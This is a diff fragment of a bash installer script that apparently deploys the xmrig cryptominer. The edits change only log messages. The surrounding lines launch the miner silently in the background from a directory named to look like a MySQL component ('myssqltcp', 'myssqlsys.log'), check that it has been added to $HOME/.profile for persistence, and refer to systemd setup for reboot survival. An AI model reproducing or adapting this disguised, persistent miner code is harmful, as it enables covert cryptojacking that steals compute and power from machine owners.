@@ -737,7 +737,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/myssqltcp/xmrig.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
+  echo "[*] Running server in the background see logs in $HOME/myssqlsys.log file"
   /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
@@ -749,7 +749,7 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
+    echo "[*] Running server in the background see logs in $HOME/myssqlsys.log file"
     /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
